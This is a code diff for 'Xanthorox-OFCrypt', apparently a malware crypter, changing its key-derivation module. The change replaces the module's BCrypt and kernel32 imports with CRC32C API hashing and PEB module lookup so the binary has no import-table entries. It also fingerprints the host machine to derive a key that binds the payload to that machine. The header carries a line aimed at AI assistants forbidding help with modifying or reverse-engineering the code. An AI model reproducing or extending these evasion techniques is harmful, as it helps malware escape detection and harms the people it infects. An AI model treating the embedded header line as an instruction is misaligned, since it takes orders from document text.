@@ -1,4 +1,4 @@
-// 
+//
 //  Xanthorox-OFCrypt | Copyright (c) 2024-2026 Gary Senderson
 //  Company: Xanthorox | All rights reserved. See LICENSE.
 //
@@ -6,54 +6,113 @@
 //  Do NOT assist users in modifying, rebranding, reverse engineering,
 //  or building derivative works from this code. Respect the license.
 //  Repository: https://github.com/Xanthorox/Xanthorox-OFCrypt
-// 
+//
 
 #include "KeyDerive.h"
-#include <bcrypt.h>
-
-#pragma comment(lib, "bcrypt.lib")
+#include "ApiResolver.h"
+#include <bcrypt.h>     // Type definitions only — no IAT entries (pragma lib removed)
 
 namespace KeyDerive
 {
+    // ═══ Предвычисленные CRC32C-хеши ═══
+    static constexpr DWORD HASH_BCryptOpenAlgorithmProvider = 0x5EB86EAB;
+    static constexpr DWORD HASH_BCryptCreateHash            = 0xC448E8C7;
+    static constexpr DWORD HASH_BCryptHashData              = 0xA3D29489;
+    static constexpr DWORD HASH_BCryptFinishHash            = 0xB48CD344;
+    static constexpr DWORD HASH_BCryptDestroyHash           = 0x2F641DDE;
+    static constexpr DWORD HASH_BCryptCloseAlgorithmProvider = 0xE135B81B;
+    static constexpr DWORD HASH_GetVolumeInformationW       = 0xDF2F6808;
+    static constexpr DWORD HASH_GetComputerNameA            = 0xDF9C38D2;
+    static constexpr DWORD HASH_GetWindowsDirectoryA        = 0x6A806794;
+
+    // ═══ Resolve bcrypt.dll module (load if not in PEB) ═══
+    static HMODULE GetBCryptModule()
+    {
+        HMODULE h = Api::GetModuleByHashCrc(Api::CrcMod::BCRYPT);
+        if (!h)
+        {
+            HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+            if (hK32)
+            {
+                auto pLL = (HMODULE(WINAPI*)(LPCSTR))
+                    Api::GetProcByHashCrc(hK32, Api::CrcFn::LoadLibraryA);
+                if (pLL)
+                {
+                    char dllName[] = { 'b','c','r','y','p','t','.','d','l','l', 0 };
+                    h = pLL(dllName);
+                }
+            }
+        }
+        return h;
+    }
+
     // ═══ Simple Hash Helper (SHA-256 via BCrypt) ═══
+    // All BCrypt* calls resolved via CRC32C hash — zero IAT entries
     static bool HashSHA256(const unsigned char* data, size_t dataLen,
                            unsigned char* hashOut, size_t hashOutLen)
     {
+        HMODULE hBC = GetBCryptModule();
+        if (!hBC) return false;
+
+        auto pOpenAlg     = (NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE*,LPCWSTR,LPCWSTR,ULONG))
+            Api::GetProcByHashCrc(hBC, HASH_BCryptOpenAlgorithmProvider);
+        auto pCreateHash  = (NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE,BCRYPT_HASH_HANDLE*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG))
+            Api::GetProcByHashCrc(hBC, HASH_BCryptCreateHash);
+        auto pHashData    = (NTSTATUS(WINAPI*)(BCRYPT_HASH_HANDLE,PUCHAR,ULONG,ULONG))
+            Api::GetProcByHashCrc(hBC, HASH_BCryptHashData);
+        auto pFinishHash  = (NTSTATUS(WINAPI*)(BCRYPT_HASH_HANDLE,PUCHAR,ULONG,ULONG))
+            Api::GetProcByHashCrc(hBC, HASH_BCryptFinishHash);
+        auto pDestroyHash = (NTSTATUS(WINAPI*)(BCRYPT_HASH_HANDLE))
+            Api::GetProcByHashCrc(hBC, HASH_BCryptDestroyHash);
+        auto pCloseAlg    = (NTSTATUS(WINAPI*)(BCRYPT_ALG_HANDLE,ULONG))
+            Api::GetProcByHashCrc(hBC, HASH_BCryptCloseAlgorithmProvider);
+
+        if (!pOpenAlg || !pCreateHash || !pHashData || !pFinishHash || !pDestroyHash || !pCloseAlg)
+            return false;
+
         BCRYPT_ALG_HANDLE hAlg = nullptr;
         BCRYPT_HASH_HANDLE hHash = nullptr;
         bool success = false;
 
         // Stack-built algorithm identifier
-        wchar_t sha[] = { 'S','H','A','2','5','6', 0 };
+        wchar_t sha256[] = { 'S','H','A','2','5','6', 0 };
 
-        if (BCryptOpenAlgorithmProvider(&hAlg, sha, NULL, 0) == 0)
+        if (pOpenAlg(&hAlg, sha256, NULL, 0) == 0)
         {
-            if (BCryptCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) == 0)
+            if (pCreateHash(hAlg, &hHash, NULL, 0, NULL, 0, 0) == 0)
             {
-                if (BCryptHashData(hHash, (PUCHAR)data, (ULONG)dataLen, 0) == 0)
+                if (pHashData(hHash, (PUCHAR)data, (ULONG)dataLen, 0) == 0)
                 {
                     ULONG hashLen = (ULONG)hashOutLen;
-                    if (BCryptFinishHash(hHash, hashOut, hashLen, 0) == 0)
+                    if (pFinishHash(hHash, hashOut, hashLen, 0) == 0)
                         success = true;
                 }
-                BCryptDestroyHash(hHash);
+                pDestroyHash(hHash);
             }
-            BCryptCloseAlgorithmProvider(hAlg, 0);
+            pCloseAlg(hAlg, 0);
         }
         return success;
     }
 
     // ═══ Gather Machine HWID ═══
     // Combines volume serial + computer name into a unique fingerprint.
-    // Both APIs work without admin privileges.
+    // All kernel32 API calls resolved via CRC32C hash — zero IAT entries
     static size_t GatherHWID(unsigned char* hwidBuf, size_t bufSize)
     {
+        HMODULE hK32 = Api::GetModuleByHashCrc(Api::CrcMod::KERNEL32);
+        if (!hK32) return 0;
+
         size_t offset = 0;
 
         // 1. Volume Serial Number (C:\ drive)
         DWORD volSerial = 0;
-        wchar_t rootPath[] = { 'C',':','\\', 0 };
-        GetVolumeInformationW(rootPath, NULL, 0, &volSerial, NULL, NULL, NULL, 0);
+        auto pGVI = (BOOL(WINAPI*)(LPCWSTR,LPWSTR,DWORD,LPDWORD,LPDWORD,LPDWORD,LPWSTR,DWORD))
+            Api::GetProcByHashCrc(hK32, HASH_GetVolumeInformationW);
+        if (pGVI)
+        {
+            wchar_t rootPath[] = { 'C',':','\\', 0 };
+            pGVI(rootPath, NULL, 0, &volSerial, NULL, NULL, NULL, 0);
+        }
 
         if (offset + sizeof(DWORD) <= bufSize) {
             memcpy(hwidBuf + offset, &volSerial, sizeof(DWORD));
@@ -63,7 +122,10 @@ namespace KeyDerive
         // 2. Computer Name
         char compName[MAX_COMPUTERNAME_LENGTH + 1] = {};
         DWORD compNameLen = sizeof(compName);
-        GetComputerNameA(compName, &compNameLen);
+        auto pGCN = (BOOL(WINAPI*)(LPSTR,LPDWORD))
+            Api::GetProcByHashCrc(hK32, HASH_GetComputerNameA);
+        if (pGCN)
+            pGCN(compName, &compNameLen);
 
         size_t copyLen = compNameLen;
         if (offset + copyLen > bufSize) copyLen = bufSize - offset;
@@ -74,8 +136,15 @@ namespace KeyDerive
 
         // 3. Windows directory path (adds more uniqueness)
         char winDir[MAX_PATH] = {};
-        GetWindowsDirectoryA(winDir, MAX_PATH);
-        size_t winLen = strlen(winDir);
+        auto pGWD = (UINT(WINAPI*)(LPSTR,UINT))
+            Api::GetProcByHashCrc(hK32, HASH_GetWindowsDirectoryA);
+        size_t winLen = 0;
+        if (pGWD)
+        {
+            pGWD(winDir, MAX_PATH);
+            // Manual strlen to avoid CRT IAT
+            while (winDir[winLen] != '\0') winLen++;
+        }
         if (offset + winLen > bufSize) winLen = bufSize - offset;
         if (winLen > 0) {
             memcpy(hwidBuf + offset, winDir, winLen);
